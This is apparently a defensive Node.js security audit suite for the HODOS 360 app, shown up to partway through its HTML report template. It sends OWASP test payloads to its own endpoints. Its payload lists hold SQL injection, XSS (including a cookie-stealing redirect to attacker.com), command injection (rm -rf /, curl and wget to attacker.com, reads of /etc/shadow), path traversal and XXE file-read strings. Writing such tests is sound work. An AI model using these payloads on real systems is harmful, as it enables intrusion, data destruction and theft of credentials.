#!/usr/bin/env node

/**
 * HODOS 360 Security Audit Suite
 * 
 * Comprehensive security testing including:
 * - SQL injection testing
 * - XSS prevention verification  
 * - Authentication bypass attempts
 * - Input validation testing
 * - Security header validation
 * - Rate limiting verification
 * - OWASP Top 10 vulnerability checks
 * - Data exposure analysis
 */

const fs = require('fs').promises;
const path = require('path');
const crypto = require('crypto');
const { performance } = require('perf_hooks');

// Import utilities
const { ApiTestUtils } = require('./api-test-utils');

/**
 * Security audit configuration
 */
const SECURITY_CONFIG = {
  // OWASP Top 10 vulnerability categories
  vulnerabilityCategories: {
    'A01_2021': 'Broken Access Control',
    'A02_2021': 'Cryptographic Failures',
    'A03_2021': 'Injection',
    'A04_2021': 'Insecure Design',
    'A05_2021': 'Security Misconfiguration',
    'A06_2021': 'Vulnerable and Outdated Components',
    'A07_2021': 'Identification and Authentication Failures',
    'A08_2021': 'Software and Data Integrity Failures',
    'A09_2021': 'Security Logging and Monitoring Failures',
    'A10_2021': 'Server-Side Request Forgery (SSRF)'
  },

  // Security test payloads
  payloads: {
    sqlInjection: [
      "'; DROP TABLE users; --",
      "' OR '1'='1",
      "'; SELECT * FROM users WHERE 't'='t",
      "' UNION SELECT NULL, username, password FROM users --",
      "'; INSERT INTO users VALUES ('hacker', 'password'); --",
      "' OR 1=1 --",
      "'; UPDATE users SET password='hacked' --",
      "\"; DROP TABLE users; --",
      "' OR SLEEP(5) --",
      "'; EXEC xp_cmdshell('dir'); --"
    ],
    
    xssPayloads: [
      "<script>alert('XSS')</script>",
      "<img src=x onerror=alert('XSS')>",
      "javascript:alert('XSS')",
      "<svg onload=alert('XSS')>",
      "';alert('XSS');//",
      "<iframe src=javascript:alert('XSS')></iframe>",
      "<body onload=alert('XSS')>",
      "<div onclick=alert('XSS')>Click me</div>",
      "<%2Fscript%3E%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E",
      "<script>document.location='http://attacker.com/steal.php?cookie='+document.cookie</script>"
    ],
    
    commandInjection: [
      "; ls -la",
      "&& dir",
      "| cat /etc/passwd",
      "; rm -rf /",
      "&& net user hacker password /add",
      "| whoami",
      "; cat /etc/shadow",
      "&& ping -c 4 attacker.com",
      "| curl http://attacker.com/exfiltrate",
      "; wget http://attacker.com/malware.sh"
    ],
    
    nosqlInjection: [
      "{'$ne': null}",
      "{'$regex': '.*'}",
      "{'$where': 'function() { return true; }'}",
      "{'$gt': ''}",
      "{'$exists': true}",
      "{'$or': [{}]}",
      "{'$nin': []}",
      "{'$all': []}",
      "{'$size': 0}",
      "{'$mod': [1, 0]}"
    ],
    
    pathTraversal: [
      "../../../etc/passwd",
      "..\\..\\..\\windows\\system32\\config\\sam",
      "....//....//....//etc//passwd",
      "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
      "..%252f..%252f..%252fetc%252fpasswd",
      "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
      "../.ssh/id_rsa",
      "../../../../../../etc/shadow",
      "..\\..\\..\\boot.ini",
      "../app.js"
    ],
    
    xxePayloads: [
      '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
      '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///c:/windows/system32/drivers/etc/hosts">]><root>&test;</root>',
      '<?xml version="1.0"?><!DOCTYPE replace [<!ENTITY ent SYSTEM "file:///etc/shadow">]><userInfo><firstName>John</firstName><lastName>&ent;</lastName></userInfo>'
    ]
  },

  // Required security headers
  requiredHeaders: {
    'x-content-type-options': 'nosniff',
    'x-frame-options': ['DENY', 'SAMEORIGIN'],
    'x-xss-protection': '1; mode=block',
    'strict-transport-security': 'max-age=',
    'content-security-policy': 'default-src',
    'referrer-policy': ['strict-origin-when-cross-origin', 'no-referrer', 'same-origin']
  },

  // Rate limiting thresholds
  rateLimiting: {
    requestsPerMinute: 100,
    burstThreshold: 200,
    testDuration: 60000 // 1 minute
  },

  // Sensitive data patterns
  sensitiveDataPatterns: [
    /\b\d{4}[\s-]\d{4}[\s-]\d{4}[\s-]\d{4}\b/, // Credit card
    /\b\d{3}-\d{2}-\d{4}\b/, // SSN
    /\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b/, // Email
    /password[\s]*[:=][\s]*['"][^'"]+['"]/, // Password in response
    /api[_-]?key[\s]*[:=][\s]*['"][^'"]+['"]/, // API key
    /secret[\s]*[:=][\s]*['"][^'"]+['"]/, // Secret
    /token[\s]*[:=][\s]*['"][^'"]+['"]/ // Token
  ]
};

class SecurityAuditor {
  constructor() {
    this.baseUrl = process.env.NEXT_PUBLIC_APP_URL || 'http://localhost:3000';
    this.utils = new ApiTestUtils(this.baseUrl);
    this.findings = [];
    this.testResults = [];
    
    // Test endpoints for security testing
    this.testEndpoints = [
      { path: '/api/health', methods: ['GET'], auth: false },
      { path: '/api/contact', methods: ['POST'], auth: false },
      { path: '/api/clients', methods: ['GET', 'POST'], auth: true },
      { path: '/api/cases', methods: ['GET', 'POST'], auth: true },
      { path: '/api/documents', methods: ['GET', 'POST'], auth: true },
      { path: '/api/ai/chat', methods: ['POST'], auth: true },
      { path: '/api/ai/legal/research', methods: ['POST'], auth: true },
      { path: '/api/upload', methods: ['POST'], auth: true },
      { path: '/api/analytics/dashboard', methods: ['GET'], auth: true }
    ];
  }

  /**
   * Main security audit execution
   */
  async runSecurityAudit() {
    console.log('🔒 HODOS 360 Security Audit Suite Starting...');
    console.log(`🌐 Target: ${this.baseUrl}`);
    console.log(`🧪 Testing ${this.testEndpoints.length} endpoints`);
    console.log('='.repeat(80));

    const startTime = performance.now();

    try {
      // Setup authentication for testing
      await this.setupSecurityTesting();

      // Run all security tests
      await this.runAllSecurityTests();

      // Generate security report
      const endTime = performance.now();
      const totalTime = endTime - startTime;
      await this.generateSecurityReport(totalTime);

      console.log('✅ Security audit completed successfully');
      return this.getAuditSummary();

    } catch (error) {
      console.error('❌ Security audit failed:', error.message);
      await this.generateErrorReport(error);
      throw error;
    }
  }

  /**
   * Setup security testing environment
   */
  async setupSecurityTesting() {
    console.log('🔧 Setting up security testing environment...');
    
    // Verify server accessibility
    try {
      const response = await this.utils.makeRequest('GET', '/api/health');
      if (response.status !== 200) {
        throw new Error(`Health check failed: ${response.status}`);
      }
      console.log('✅ Server accessibility verified');
    } catch (error) {
      throw new Error(`Cannot access server: ${error.message}`);
    }

    // Setup test credentials
    try {
      this.testApiKey = await this.utils.createTestApiKey();
      this.testUserToken = await this.utils.createTestUserToken();
      console.log('✅ Test credentials prepared');
    } catch (error) {
      console.log('⚠️  Using mock credentials for security testing');
      this.testApiKey = 'security-test-api-key';
      this.testUserToken = 'security-test-user-token';
    }
  }

  /**
   * Run all security tests
   */
  async runAllSecurityTests() {
    console.log('\n🛡️  Running comprehensive security tests...\n');

    // A01: Broken Access Control
    await this.testBrokenAccessControl();
    
    // A02: Cryptographic Failures
    await this.testCryptographicFailures();
    
    // A03: Injection Attacks
    await this.testInjectionVulnerabilities();
    
    // A04: Insecure Design
    await this.testInsecureDesign();
    
    // A05: Security Misconfiguration
    await this.testSecurityMisconfiguration();
    
    // A07: Authentication Failures
    await this.testAuthenticationFailures();
    
    // Additional security tests
    await this.testRateLimiting();
    await this.testDataExposure();
    await this.testInputValidation();
    await this.testSessionManagement();
  }

  /**
   * Test for broken access control (A01)
   */
  async testBrokenAccessControl() {
    console.log('🔍 Testing Broken Access Control (A01)...');
    const category = 'A01_2021';

    // Test unauthenticated access to protected endpoints
    for (const endpoint of this.testEndpoints.filter(e => e.auth)) {
      for (const method of endpoint.methods) {
        try {
          const response = await this.utils.makeRequest(method, endpoint.path);
          
          if (response.status === 200) {
            this.addFinding(category, 'HIGH', 
              `Unauthenticated access allowed to ${method} ${endpoint.path}`,
              { endpoint: endpoint.path, method, status: response.status }
            );
          } else if ([401, 403].includes(response.status)) {
            this.addTestResult(category, 'access-control-unauthenticated', true, endpoint.path);
          }
        } catch (error) {
          this.addTestResult(category, 'access-control-unauthenticated', false, endpoint.path, error.message);
        }
      }
    }

    // Test privilege escalation
    await this.testPrivilegeEscalation(category);

    // Test horizontal access control
    await this.testHorizontalAccessControl(category);

    console.log('   ✓ Access control tests completed');
  }

  /**
   * Test for cryptographic failures (A02)
   */
  async testCryptographicFailures() {
    console.log('🔍 Testing Cryptographic Failures (A02)...');
    const category = 'A02_2021';

    // Test HTTPS enforcement
    if (this.baseUrl.startsWith('http://')) {
      this.addFinding(category, 'MEDIUM',
        'Application not enforcing HTTPS',
        { baseUrl: this.baseUrl }
      );
    }

    // Test for sensitive data in transit
    await this.testSensitiveDataInTransit(category);

    // Test password handling
    await this.testPasswordSecurity(category);

    console.log('   ✓ Cryptographic failure tests completed');
  }

  /**
   * Test for injection vulnerabilities (A03)
   */
  async testInjectionVulnerabilities() {
    console.log('🔍 Testing Injection Vulnerabilities (A03)...');
    const category = 'A03_2021';

    // SQL Injection tests
    await this.testSQLInjection(category);

    // XSS tests
    await this.testXSSVulnerabilities(category);

    // Command injection tests
    await this.testCommandInjection(category);

    // NoSQL injection tests
    await this.testNoSQLInjection(category);

    // XXE tests
    await this.testXXEVulnerabilities(category);

    console.log('   ✓ Injection vulnerability tests completed');
  }

  /**
   * Test SQL injection vulnerabilities
   */
  async testSQLInjection(category) {
    const postEndpoints = this.testEndpoints.filter(e => e.methods.includes('POST'));

    for (const endpoint of postEndpoints.slice(0, 3)) {
      for (const payload of SECURITY_CONFIG.payloads.sqlInjection.slice(0, 5)) {
        try {
          const testData = { testField: payload, email: payload, query: payload };
          const headers = endpoint.auth ? {
            'Authorization': `Bearer ${this.testUserToken}`,
            'X-API-Key': this.testApiKey
          } : {};

          const response = await this.utils.makeRequest('POST', endpoint.path, testData, headers);

          // Check for SQL error messages in response
          const responseText = JSON.stringify(response.data).toLowerCase();
          const sqlErrors = ['sql syntax', 'mysql', 'postgres', 'sqlite', 'oracle error', 'syntax error'];
          
          if (sqlErrors.some(error => responseText.includes(error))) {
            this.addFinding(category, 'HIGH',
              `Possible SQL injection vulnerability in ${endpoint.path}`,
              { endpoint: endpoint.path, payload, response: response.status }
            );
          }

          // Check for unusual response times (potential blind SQL injection)
          if (payload.includes('SLEEP') && response.responseTime > 5000) {
            this.addFinding(category, 'HIGH',
              `Possible time-based SQL injection in ${endpoint.path}`,
              { endpoint: endpoint.path, payload, responseTime: response.responseTime }
            );
          }

        } catch (error) {
          // Connection errors might indicate successful injection
          if (error.message.includes('connection') || error.message.includes('timeout')) {
            this.addFinding(category, 'MEDIUM',
              `Potential SQL injection causing connection issues in ${endpoint.path}`,
              { endpoint: endpoint.path, payload, error: error.message }
            );
          }
        }
      }
    }
  }

  /**
   * Test XSS vulnerabilities
   */
  async testXSSVulnerabilities(category) {
    const postEndpoints = this.testEndpoints.filter(e => e.methods.includes('POST'));

    for (const endpoint of postEndpoints.slice(0, 3)) {
      for (const payload of SECURITY_CONFIG.payloads.xssPayloads.slice(0, 5)) {
        try {
          const testData = { message: payload, content: payload, description: payload };
          const headers = endpoint.auth ? {
            'Authorization': `Bearer ${this.testUserToken}`,
            'X-API-Key': this.testApiKey
          } : {};

          const response = await this.utils.makeRequest('POST', endpoint.path, testData, headers);

          // Check if payload is reflected in response
          const responseText = JSON.stringify(response.data);
          if (responseText.includes(payload)) {
            this.addFinding(category, 'HIGH',
              `Possible XSS vulnerability in ${endpoint.path}`,
              { endpoint: endpoint.path, payload, reflected: true }
            );
          }

        } catch (error) {
          // Log but continue testing
        }
      }
    }
  }

  /**
   * Test command injection
   */
  async testCommandInjection(category) {
    const endpoints = this.testEndpoints.filter(e => 
      e.path.includes('upload') || e.path.includes('file') || e.methods.includes('POST')
    );

    for (const endpoint of endpoints.slice(0, 2)) {
      for (const payload of SECURITY_CONFIG.payloads.commandInjection.slice(0, 3)) {
        try {
          const testData = { 
            filename: payload, 
            command: payload,
            path: payload,
            input: payload
          };
          const headers = endpoint.auth ? {
            'Authorization': `Bearer ${this.testUserToken}`,
            'X-API-Key': this.testApiKey
          } : {};

          const response = await this.utils.makeRequest('POST', endpoint.path, testData, headers);

          // Check for command output in response
          const responseText = JSON.stringify(response.data).toLowerCase();
          const commandIndicators = ['root:', 'administrator', 'system32', 'usr/bin', 'total'];
          
          if (commandIndicators.some(indicator => responseText.includes(indicator))) {
            this.addFinding(category, 'CRITICAL',
              `Command injection vulnerability in ${endpoint.path}`,
              { endpoint: endpoint.path, payload }
            );
          }

        } catch (error) {
          // Log but continue
        }
      }
    }
  }

  /**
   * Test NoSQL injection
   */
  async testNoSQLInjection(category) {
    const postEndpoints = this.testEndpoints.filter(e => e.methods.includes('POST'));

    for (const endpoint of postEndpoints.slice(0, 2)) {
      for (const payload of SECURITY_CONFIG.payloads.nosqlInjection.slice(0, 3)) {
        try {
          const testData = { query: JSON.parse(payload) };
          const headers = endpoint.auth ? {
            'Authorization': `Bearer ${this.testUserToken}`,
            'X-API-Key': this.testApiKey
          } : {};

          const response = await this.utils.makeRequest('POST', endpoint.path, testData, headers);

          // Check for MongoDB errors or unusual responses
          const responseText = JSON.stringify(response.data).toLowerCase();
          if (responseText.includes('mongodb') || responseText.includes('$where')) {
            this.addFinding(category, 'HIGH',
              `Possible NoSQL injection in ${endpoint.path}`,
              { endpoint: endpoint.path, payload }
            );
          }

        } catch (error) {
          // JSON parse errors are expected for some payloads
        }
      }
    }
  }

  /**
   * Test XXE vulnerabilities
   */
  async testXXEVulnerabilities(category) {
    const endpoints = this.testEndpoints.filter(e => e.methods.includes('POST'));

    for (const endpoint of endpoints.slice(0, 2)) {
      for (const payload of SECURITY_CONFIG.payloads.xxePayloads) {
        try {
          const headers = {
            'Content-Type': 'application/xml',
            ...(endpoint.auth ? {
              'Authorization': `Bearer ${this.testUserToken}`,
              'X-API-Key': this.testApiKey
            } : {})
          };

          const response = await fetch(`${this.baseUrl}${endpoint.path}`, {
            method: 'POST',
            headers,
            body: payload
          });

          const responseText = await response.text();

          // Check for file contents in response
          if (responseText.includes('root:') || responseText.includes('localhost')) {
            this.addFinding(category, 'CRITICAL',
              `XXE vulnerability in ${endpoint.path}`,
              { endpoint: endpoint.path }
            );
          }

        } catch (error) {
          // Continue testing
        }
      }
    }
  }

  /**
   * Test insecure design (A04)
   */
  async testInsecureDesign() {
    console.log('🔍 Testing Insecure Design (A04)...');
    const category = 'A04_2021';

    // Test business logic flaws
    await this.testBusinessLogicFlaws(category);

    console.log('   ✓ Insecure design tests completed');
  }

  /**
   * Test security misconfiguration (A05)
   */
  async testSecurityMisconfiguration() {
    console.log('🔍 Testing Security Misconfiguration (A05)...');
    const category = 'A05_2021';

    // Test security headers
    await this.testSecurityHeaders(category);

    // Test error handling
    await this.testErrorHandling(category);

    // Test default configurations
    await this.testDefaultConfigurations(category);

    console.log('   ✓ Security misconfiguration tests completed');
  }

  /**
   * Test security headers
   */
  async testSecurityHeaders(category) {
    try {
      const response = await this.utils.makeRequest('GET', '/api/health');
      
      for (const [header, expectedValue] of Object.entries(SECURITY_CONFIG.requiredHeaders)) {
        const headerValue = response.headers.get ? response.headers.get(header) : null;
        
        if (!headerValue) {
          this.addFinding(category, 'MEDIUM',
            `Missing security header: ${header}`,
            { header, endpoint: '/api/health' }
          );
        } else if (Array.isArray(expectedValue)) {
          if (!expectedValue.some(val => headerValue.includes(val))) {
            this.addFinding(category, 'LOW',
              `Security header ${header} has unexpected value: ${headerValue}`,
              { header, actual: headerValue, expected: expectedValue }
            );
          }
        } else if (!headerValue.includes(expectedValue)) {
          this.addFinding(category, 'LOW',
            `Security header ${header} has unexpected value: ${headerValue}`,
            { header, actual: headerValue, expected: expectedValue }
          );
        }
      }
    } catch (error) {
      this.addFinding(category, 'HIGH',
        'Unable to test security headers',
        { error: error.message }
      );
    }
  }

  /**
   * Test authentication failures (A07)
   */
  async testAuthenticationFailures() {
    console.log('🔍 Testing Authentication Failures (A07)...');
    const category = 'A07_2021';

    // Test weak authentication
    await this.testWeakAuthentication(category);

    // Test session management
    await this.testSessionManagement(category);

    console.log('   ✓ Authentication failure tests completed');
  }

  /**
   * Test rate limiting
   */
  async testRateLimiting() {
    console.log('🔍 Testing Rate Limiting...');
    const category = 'rate-limiting';

    const endpoint = '/api/health';
    const requestsToSend = 50;
    const requests = [];

    // Send rapid requests
    for (let i = 0; i < requestsToSend; i++) {
      requests.push(this.utils.makeRequest('GET', endpoint));
    }

    try {
      const responses = await Promise.allSettled(requests);
      const rateLimited = responses.some(r => 
        r.status === 'fulfilled' && r.value.status === 429
      );

      if (!rateLimited) {
        this.addFinding(category, 'MEDIUM',
          'Rate limiting not implemented or threshold too high',
          { endpoint, requestsSent: requestsToSend }
        );
      } else {
        this.addTestResult(category, 'rate-limiting', true, endpoint);
      }
    } catch (error) {
      this.addTestResult(category, 'rate-limiting', false, endpoint, error.message);
    }

    console.log('   ✓ Rate limiting tests completed');
  }

  /**
   * Test for sensitive data exposure
   */
  async testDataExposure() {
    console.log('🔍 Testing Data Exposure...');
    const category = 'data-exposure';

    for (const endpoint of this.testEndpoints.slice(0, 5)) {
      try {
        const headers = endpoint.auth ? {
          'Authorization': `Bearer ${this.testUserToken}`,
          'X-API-Key': this.testApiKey
        } : {};

        const response = await this.utils.makeRequest('GET', endpoint.path, null, headers);
        
        if (response.data) {
          const responseText = JSON.stringify(response.data);
          
          // Check for sensitive data patterns
          for (const pattern of SECURITY_CONFIG.sensitiveDataPatterns) {
            if (pattern.test(responseText)) {
              this.addFinding(category, 'HIGH',
                `Sensitive data exposed in ${endpoint.path}`,
                { endpoint: endpoint.path, pattern: pattern.source }
              );
            }
          }
        }
      } catch (error) {
        // Continue testing
      }
    }

    console.log('   ✓ Data exposure tests completed');
  }

  /**
   * Test input validation
   */
  async testInputValidation() {
    console.log('🔍 Testing Input Validation...');
    const category = 'input-validation';

    const invalidInputs = [
      { name: 'oversized-string', data: { field: 'x'.repeat(100000) } },
      { name: 'null-bytes', data: { field: 'test\x00null' } },
      { name: 'unicode-exploitation', data: { field: '\u0000\uFEFF\u200B' } },
      { name: 'format-string', data: { field: '%s%s%s%s%s' } },
      { name: 'buffer-overflow', data: { field: 'A'.repeat(10000) } }
    ];

    const postEndpoints = this.testEndpoints.filter(e => e.methods.includes('POST'));

    for (const endpoint of postEndpoints.slice(0, 3)) {
      for (const testInput of invalidInputs) {
        try {
          const headers = endpoint.auth ? {
            'Authorization': `Bearer ${this.testUserToken}`,
            'X-API-Key': this.testApiKey
          } : {};

          const response = await this.utils.makeRequest('POST', endpoint.path, testInput.data, headers);

          // Server should reject invalid input with 4xx status
          if (response.status >= 200 && response.status < 400) {
            this.addFinding(category, 'MEDIUM',
              `Insufficient input validation for ${testInput.name} in ${endpoint.path}`,
              { endpoint: endpoint.path, testType: testInput.name, status: response.status }
            );
          } else {
            this.addTestResult(category, `input-validation-${testInput.name}`, true, endpoint.path);
          }
        } catch (error) {
          // Timeouts or crashes might indicate vulnerability
          if (error.message.includes('timeout') || error.message.includes('crash')) {
            this.addFinding(category, 'HIGH',
              `Input validation issue causing ${error.message} in ${endpoint.path}`,
              { endpoint: endpoint.path, testType: testInput.name, error: error.message }
            );
          }
        }
      }
    }

    console.log('   ✓ Input validation tests completed');
  }

  // Helper methods for specific vulnerability tests
  async testPrivilegeEscalation(category) {
    // Test if low-privilege user can access admin endpoints
    const adminEndpoints = ['/api/admin', '/api/users', '/api/system'];
    
    for (const endpoint of adminEndpoints) {
      try {
        const response = await this.utils.makeRequest('GET', endpoint, null, {
          'Authorization': `Bearer ${this.testUserToken}`
        });
        
        if (response.status === 200) {
          this.addFinding(category, 'HIGH',
            `Possible privilege escalation: regular user can access ${endpoint}`,
            { endpoint, status: response.status }
          );
        }
      } catch (error) {
        // Expected behavior
      }
    }
  }

  async testHorizontalAccessControl(category) {
    // Test if user can access another user's data
    const userEndpoints = [
      '/api/clients/user-123',
      '/api/cases/case-456',
      '/api/documents/doc-789'
    ];
    
    for (const endpoint of userEndpoints) {
      try {
        const response = await this.utils.makeRequest('GET', endpoint, null, {
          'Authorization': `Bearer ${this.testUserToken}`
        });
        
        // Should return 403 or 404, not 200 with data
        if (response.status === 200 && response.data) {
          this.addFinding(category, 'MEDIUM',
            `Possible horizontal access control bypass in ${endpoint}`,
            { endpoint, status: response.status }
          );
        }
      } catch (error) {
        // Expected behavior
      }
    }
  }

  async testSensitiveDataInTransit(category) {
    // Test if sensitive endpoints are accessible over HTTP
    if (this.baseUrl.startsWith('http://')) {
      const sensitiveEndpoints = ['/api/auth', '/api/clients', '/api/documents'];
      
      for (const endpoint of sensitiveEndpoints) {
        this.addFinding(category, 'HIGH',
          `Sensitive endpoint ${endpoint} accessible over HTTP`,
          { endpoint, protocol: 'HTTP' }
        );
      }
    }
  }

  async testPasswordSecurity(category) {
    // Test password policies in authentication endpoint
    const weakPasswords = ['123456', 'password', 'admin', 'test'];
    
    for (const password of weakPasswords) {
      try {
        const response = await this.utils.makeRequest('POST', '/api/auth/register', {
          email: 'test@example.com',
          password: password
        });
        
        if (response.status < 400) {
          this.addFinding(category, 'MEDIUM',
            'Weak password policy allows common passwords',
            { password, status: response.status }
          );
        }
      } catch (error) {
        // Continue testing
      }
    }
  }

  async testBusinessLogicFlaws(category) {
    // Test for business logic bypass (e.g., negative quantities, price manipulation)
    const logicTests = [
      { field: 'quantity', value: -1 },
      { field: 'price', value: 0 },
      { field: 'discount', value: 999999 },
      { field: 'amount', value: -1000 }
    ];
    
    for (const test of logicTests) {
      try {
        const testData = { [test.field]: test.value };
        const response = await this.utils.makeRequest('POST', '/api/orders', testData, {
          'Authorization': `Bearer ${this.testUserToken}`
        });
        
        if (response.status < 400) {
          this.addFinding(category, 'MEDIUM',
            `Business logic flaw: ${test.field} accepts invalid value ${test.value}`,
            { field: test.field, value: test.value, status: response.status }
          );
        }
      } catch (error) {
        // Continue testing
      }
    }
  }

  async testErrorHandling(category) {
    // Test if application leaks information in error messages
    const errorTriggers = [
      { path: '/api/nonexistent', expectedStatus: 404 },
      { path: '/api/clients/invalid-id', expectedStatus: 400 },
      { path: '/api/documents', method: 'POST', data: 'invalid-json' }
    ];
    
    for (const trigger of errorTriggers) {
      try {
        const response = await this.utils.makeRequest(
          trigger.method || 'GET', 
          trigger.path, 
          trigger.data
        );
        
        if (response.data && typeof response.data === 'string') {
          const errorText = response.data.toLowerCase();
          const sensitiveInfo = ['stack trace', 'file path', 'database', 'sql', 'internal server'];
          
          if (sensitiveInfo.some(info => errorText.includes(info))) {
            this.addFinding(category, 'LOW',
              `Information disclosure in error message for ${trigger.path}`,
              { endpoint: trigger.path, errorContent: response.data.substring(0, 200) }
            );
          }
        }
      } catch (error) {
        // Continue testing
      }
    }
  }

  async testDefaultConfigurations(category) {
    // Test for common default configurations
    const defaultPaths = [
      '/admin',
      '/api/docs',
      '/swagger',
      '/health',
      '/debug',
      '/test',
      '/.env',
      '/config.json'
    ];
    
    for (const path of defaultPaths) {
      try {
        const response = await this.utils.makeRequest('GET', path);
        
        if (response.status === 200) {
          this.addFinding(category, 'LOW',
            `Default configuration endpoint accessible: ${path}`,
            { path, status: response.status }
          );
        }
      } catch (error) {
        // Expected behavior
      }
    }
  }

  async testWeakAuthentication(category) {
    // Test for weak authentication mechanisms
    const authTests = [
      { type: 'no-password', data: { email: 'test@example.com' } },
      { type: 'empty-password', data: { email: 'test@example.com', password: '' } },
      { type: 'sql-injection-auth', data: { email: "admin' OR '1'='1", password: 'any' } }
    ];
    
    for (const test of authTests) {
      try {
        const response = await this.utils.makeRequest('POST', '/api/auth/login', test.data);
        
        if (response.status < 400) {
          this.addFinding(category, 'HIGH',
            `Weak authentication: ${test.type} bypass successful`,
            { testType: test.type, status: response.status }
          );
        }
      } catch (error) {
        // Continue testing
      }
    }
  }

  async testSessionManagement(category) {
    // Test session security
    try {
      const response = await this.utils.makeRequest('POST', '/api/auth/login', {
        email: 'test@example.com',
        password: 'TestPassword123!'
      });
      
      if (response.headers.get) {
        const setCookie = response.headers.get('set-cookie');
        if (setCookie) {
          // Check for secure cookie attributes
          if (!setCookie.includes('HttpOnly')) {
            this.addFinding(category, 'MEDIUM',
              'Session cookies missing HttpOnly flag',
              { cookie: setCookie }
            );
          }
          
          if (!setCookie.includes('Secure') && this.baseUrl.startsWith('https://')) {
            this.addFinding(category, 'MEDIUM',
              'Session cookies missing Secure flag',
              { cookie: setCookie }
            );
          }
          
          if (!setCookie.includes('SameSite')) {
            this.addFinding(category, 'LOW',
              'Session cookies missing SameSite attribute',
              { cookie: setCookie }
            );
          }
        }
      }
    } catch (error) {
      // Continue testing
    }
  }

  // Utility methods
  addFinding(category, severity, description, details = {}) {
    this.findings.push({
      category,
      severity,
      description,
      details,
      timestamp: new Date().toISOString(),
      vulnerabilityType: SECURITY_CONFIG.vulnerabilityCategories[category] || category
    });
  }

  addTestResult(category, testName, passed, endpoint, error = null) {
    this.testResults.push({
      category,
      testName,
      passed,
      endpoint,
      error,
      timestamp: new Date().toISOString()
    });
  }

  /**
   * Generate comprehensive security report
   */
  async generateSecurityReport(totalTime) {
    console.log('\n📊 Generating security audit report...');
    
    const summary = this.getAuditSummary();
    const report = {
      timestamp: new Date().toISOString(),
      duration: Math.round(totalTime),
      summary,
      findings: this.findings,
      testResults: this.testResults,
      environment: {
        baseUrl: this.baseUrl,
        nodeVersion: process.version,
        platform: process.platform
      },
      owaspCategories: this.getOWASPCategorySummary(),
      recommendations: this.generateRecommendations()
    };

    // Save detailed report
    const reportPath = path.join(__dirname, '..', 'test-reports', 
      `security-audit-report-${Date.now()}.json`);
    
    await fs.mkdir(path.dirname(reportPath), { recursive: true });
    await fs.writeFile(reportPath, JSON.stringify(report, null, 2));

    // Generate HTML report
    await this.generateSecurityHtmlReport(report, reportPath.replace('.json', '.html'));

    console.log(`📁 Security audit report saved: ${reportPath}`);
    console.log(`🌐 HTML report: ${reportPath.replace('.json', '.html')}`);

    // Print summary
    this.printSecuritySummary(summary);

    return report;
  }

  /**
   * Generate HTML security report
   */
  async generateSecurityHtmlReport(report, outputPath) {
    const severityColors = {
      CRITICAL: '#dc2626',
      HIGH: '#ea580c',
      MEDIUM: '#d97706',
      LOW: '#65a30d'
    };

    const html = `
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>HODOS 360 Security Audit Report</title>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; margin: 0; padding: 20px; background: #f8fafc; }
        .container { max-width: 1200px; margin: 0 auto; }
        .header { background: linear-gradient(135deg, #dc2626 0%, #991b1b 100%); color: white; padding: 30px; border-radius: 10px; margin-bottom: 30px; }
        .header h1 { margin: 0; font-size: 2.5em; }
        .summary { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 20px; margin-bottom: 30px; }
        .metric { background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); text-align: center; }
        .metric-value { font-size: 2em; font-weight: bold; margin-bottom: 5px; }
        .critical { color: #dc2626; }
        .high { color: #ea580c; }
        .medium { color: #d97706; }
        .low { color: #65a30d; }
        .section { background: white; padding: 25px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); margin-bottom: 25px; }
        .section h2 { margin-top: 0; color: #1f2937; }
        .finding { border-left: 4px solid; padding: 15px; margin-bottom: 15px; border-radius: 0 4px 4px 0; }
        .finding-critical { background: #fef2f2; border-color: #dc2626; }
        .finding-high { background: #fff7ed; border-color: #ea580c; }
        .finding-medium { background: #fefce8; border-color: #d97706; }
        .finding-low { background: #f0fdf4; border-color: #65a30d; }
        .finding-title { font-weight: bold; margin-bottom: 8px; }
        .finding-details { color: #6b7280; font-size: 0.9em; }
        .owasp-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 15px; }
        .owasp-item { background: #f9fafb; padding: 15px; border-radius: 6px; border-left: 4px solid #3b82f6; }
        .recommendations { background: #ecfdf5; border: 1px solid #10b981; padding: 20px; border-radius: 8px; }
        .recommendations h3 { color: #047857; margin-top: 0; }
        .recommendations ul { color: #065f46; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🛡️ HODOS 360 Security Audit Report</h1>
            <p>Generated on ${new Date(report.timestamp).toLocaleString()}</p>
        </div>
        
        <div class="summary">
            <div class="metric">
                <div class="metric-value">${report.summary.totalFindings}</div>
                <div>Total Findings</div>
            </div>
            <div class="metric">
                <div class="metric-value critical">${report.summary.critical}</div>
                <div>Critical</div>
            </div>
            <div class="metric">
                <div class="metric-value high">${report.summary.high}</div>
                <div>High</div>
            </div>
            <div class="metric">
                <div class="metric-value medium">${report.summary.medium}</div>
                <div>Medium</div>
            </div>
            <div class="metric">
                <div class="metric-value low">${report.summary.low}</div>
                <div>Low</div>
            </div>
            <div class="metric">
                <div class="metric-value">${report.summary.riskScore}</div>
                <div>Risk Score</div>
            </div>
        </div>
        
        ${report.summary.totalFindings > 0 ? `
        <div class="section">
            <h2>🚨 Security Findings</h2>
            ${report.findings.map(finding => `
                <div class="finding finding-${finding.severity.toLowerCase()}">
                    <div class="finding-title">
                        <span style="color: ${severityColors[finding.severity] || '#000'}">[${finding.severity}]</span>
                        ${finding.vulnerabilityType}: ${finding.description}
                    </div>
                    <div class="finding-details">
                        ${Object.entries(finding.details).map(([key, value]) => 
                            `<strong>${key}:</strong> ${typeof value === 'object' ? JSON.stringify(value) : value}`
                        ).join(' | ')}
                    </div>
                </div>
            `).join('')}
        </div>
